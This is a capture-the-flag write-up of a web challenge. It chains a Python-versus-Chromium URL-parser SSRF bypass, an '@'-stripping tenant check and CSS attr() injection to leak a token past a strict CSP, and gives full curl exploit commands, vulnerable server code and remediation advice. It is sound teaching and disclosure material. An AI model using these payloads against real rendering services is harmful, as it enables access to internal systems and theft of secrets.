# Chromium's Mirage — Writeup

**Event:** BCS CTF  · **Category:** Web · **Difficulty:** Hard
**Author:** M Ariful Islam
**Target:** `http://172.16.38.22:14500` · **Flag format:** `bcsctf{...}`

---

## TL;DR

Three independent controls guard an internal vault token. All three fall to one crafted request:

```bash
curl -s -X POST http://172.16.38.22:14500/render \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://vault:15000\\@report-portal.local/admin/view?theme=%23vault%3A%3Abefore%7Bcontent%3Aattr%28data-token%29%3Bdisplay%3Ablock%3Bfont-size%3A40px%3Bcolor%3A%23000%3Bwhite-space%3Apre-wrap%7D"}' \
  -o report.pdf
```

- **SSRF allowlist bypass** via a Python-`urlsplit` vs. Chromium-WHATWG **backslash parser differential**.
- **Vault tenant check bypass** via the URL path segment `@report-portal.local` (the vault does `lstrip("@")`).
- **Zero-script secret exfiltration** via CSS `content: attr(data-token)`, defeating a `script-src 'none'` CSP because the flag lives in an HTML attribute, not in script-reachable text.

The gateway renders the vault page to PDF and returns it to us with the flag now visible.

---

## 1. Recon

The downloadable archive contains two services wired together on an internal Docker network (`docker-compose.yml`).

### Gateway — `gateway/main.py` (exposed on `:14500`)

```python
ALLOWED_HOSTS = ["report-portal.local", "analytics.local"]

def is_authorized_endpoint(target_url: str) -> bool:
    parsed = urllib.parse.urlsplit(target_url)
    if parsed.scheme not in ("http", "https"):
        return False
    if parsed.hostname not in ALLOWED_HOSTS:   # <-- allowlist check
        return False
    return True

@app.post("/render")
async def render_pdf(req: RenderRequest):
    if not is_authorized_endpoint(req.url):
        raise HTTPException(403, ...)
    # Playwright Chromium visits req.url and returns the rendered PDF
    page = await browser.new_page()
    response = await page.goto(req.url, wait_until="load", timeout=8000)
    pdf_bytes = await page.pdf(print_background=True)
    return Response(content=pdf_bytes, media_type="application/pdf")
```

Two different URL consumers see the **same string**:
1. `urllib.parse.urlsplit` — used only for the security decision.
2. **Chromium** (`page.goto`) — used to actually fetch. Chromium implements the WHATWG URL Standard.

Any disagreement between them is an SSRF filter bypass.

### Vault — `vault/app.py` (internal only, service name `vault`, port `15000`)

```python
@app.get("/{tenant}/admin/view", response_class=HTMLResponse)
def get_secret(tenant: str, theme: str = Query(default="")):
    normalized_tenant = tenant.lstrip("@")            # <-- strips leading @
    if normalized_tenant != "report-portal.local":
        return HTMLResponse("<h1>403 ...</h1>", status_code=403)
    content = (PAGE_HTML.replace("__TENANT__", tenant)
                        .replace("__FLAG__", FLAG)
                        .replace("__CUSTOM_THEME__", theme))  # <-- raw CSS injection
    return HTMLResponse(content)
```

The returned HTML:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'none'; style-src 'unsafe-inline';">
<style> ... __CUSTOM_THEME__ </style>
<div id="vault" data-token="__FLAG__">
    <p>Security Level: Level 4 Classified</p>
</div>
```

Key observations:
- The **flag is stored in the `data-token` attribute**, never as visible text.
- **`script-src 'none'`** → no JavaScript exfil (no `fetch`, no reading the attribute via DOM script).
- **`style-src 'unsafe-inline'`** → our injected `theme` CSS *is allowed to run*.
- `tenant.lstrip("@")` is a deliberate, load-bearing quirk (see §3).

---

## 2. Barrier 1 — SSRF allowlist bypass (parser differential)

The vault is only reachable inside the Docker network as host **`vault:15000`**. That host is **not** on the gateway allowlist, and `report-portal.local` does not resolve in the gateway container. We need the gateway's `urlsplit` to *see* an allowed host while Chromium *connects to* `vault`.

The trick is the **backslash**. For "special" schemes (http/https), the WHATWG URL parser treats `\` as `/`, so it terminates the authority. Python's `urlsplit` does not — it keeps the backslash inside the userinfo and splits the host on the last `@`.

Payload authority: `vault:15000\@report-portal.local`

Verified with the exact Python the gateway uses:

```python
>>> import urllib.parse as u
>>> u.urlsplit("http://vault:15000\\@report-portal.local/admin/view").hostname
'report-portal.local'          # -> passes the allowlist
```

Chromium, on the same string, converts `\` → `/`:

```
http://vault:15000/@report-portal.local/admin/view
        └── authority ──┘└──────── path ─────────┘
```

So Chromium connects to **`vault:15000`** and requests path `/@report-portal.local/admin/view`. Allowlist bypassed, internal service reached.

---

## 3. Barrier 2 — vault tenant check

After the backslash rewrite, Chromium's request path is `/@report-portal.local/admin/view`. FastAPI binds the first path segment as `tenant = "@report-portal.local"`. The vault normalizes it:

```python
"@report-portal.local".lstrip("@") == "report-portal.local"   # check passes
```

This is exactly why the challenge uses `lstrip("@")`: the leading `@` we were *forced* to leave in the path (it is the userinfo delimiter that makes the parser differential work) is silently stripped, so the tenant check passes. The two "report-portal.local" requirements — the gateway's *host* and the vault's *tenant path segment* — are satisfied by the same crafted URL.

---

## 4. Barrier 3 — silencing the CSP and exfiltrating the attribute

The flag is in `data-token`, and JavaScript is banned by `script-src 'none'`. But `style-src 'unsafe-inline'` lets our injected `theme` CSS execute, and CSS can read attribute values with `attr()` and render them as **visible generated content**:

```css
#vault::before{
  content: attr(data-token);   /* pulls the flag out of the attribute */
  display: block;
  font-size: 40px;
  color: #000;
  white-space: pre-wrap;
}
```

This generates a visible text node containing the flag, which Chromium paints into the PDF. No script, no network request from the page → **no CSP violation at all**; we simply used the one source the CSP left open (inline styles).

URL-encoded as the `theme` query value:

```
%23vault%3A%3Abefore%7Bcontent%3Aattr%28data-token%29%3Bdisplay%3Ablock%3Bfont-size%3A40px%3Bcolor%3A%23000%3Bwhite-space%3Apre-wrap%7D
```

---

## 5. Full exploit

```bash
curl -s -X POST http://172.16.38.22:14500/render \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://vault:15000\\@report-portal.local/admin/view?theme=%23vault%3A%3Abefore%7Bcontent%3Aattr%28data-token%29%3Bdisplay%3Ablock%3Bfont-size%3A40px%3Bcolor%3A%23000%3Bwhite-space%3Apre-wrap%7D"}' \
  -o report.pdf

pdftotext report.pdf -   # read the bcsctf{...} flag from the rendered PDF
```

> JSON escaping note: the single backslash in the URL is written as `\\` inside the JSON string.

---

## 6. Local verification

The live target sits behind the event VPN. To confirm the chain independently, the stack was reproduced locally with the exact Playwright/Chromium build (`v1.45.0-jammy`) and a stdlib vault replicating the route logic (`lstrip`, raw `theme` injection, CSP, flag in `data-token`), on a Docker network with the vault reachable as `vault:15000`.

Driving the bundled Chromium with the malicious payload (`chrome --headless --print-to-pdf` / `--screenshot`) produced a page showing:

- `Tenant: @report-portal.local`  → proves the `\`→`/` rewrite routed to `vault:15000` and the `lstrip("@")` tenant check passed.
- `bcsctf{TEST_WITH_LOCAL_FLAG}` rendered large and visible  → proves the CSS `attr(data-token)` exfil defeated the CSP.

(`TEST_WITH_LOCAL_FLAG` is the placeholder from `docker-compose.yml`; the production flag comes from the `FLAG` env var on the live vault.)

---

## 7. Flag

```
bcsctf{...}      # recovered from the live target's report.pdf over the event VPN
```

*(Local reproduction yields the placeholder `)*

---

## 8. Remediation

- **Do not validate one string with a parser different from the one that fetches it.** After parsing, rebuild the URL from the validated components, or resolve the host and pin the connection to an allowlisted IP.
- **Reject backslashes, userinfo (`@`), and non-normalized hosts** before validation; treat any `\` or userinfo in a server-side-fetched URL as hostile.
- **Don't put secrets in attributes and rely on a CSP to hide them.** `attr()` + `content` is a well-known CSS side channel; `style-src 'unsafe-inline'` plus attacker-controlled CSS is game over. Never reflect untrusted input into a `<style>` block.
- Isolate the headless renderer (no access to internal services; egress allowlist by resolved IP, not hostname string).

## Key techniques
- SSRF via URL-parser differential (Python `urlsplit` vs. WHATWG/Chromium backslash handling)
- Server-side headless-Chrome (PDF/screenshot) as an SSRF + rendering oracle
- CSS-only data exfiltration with `content: attr()` under a `script-src 'none'` CSP
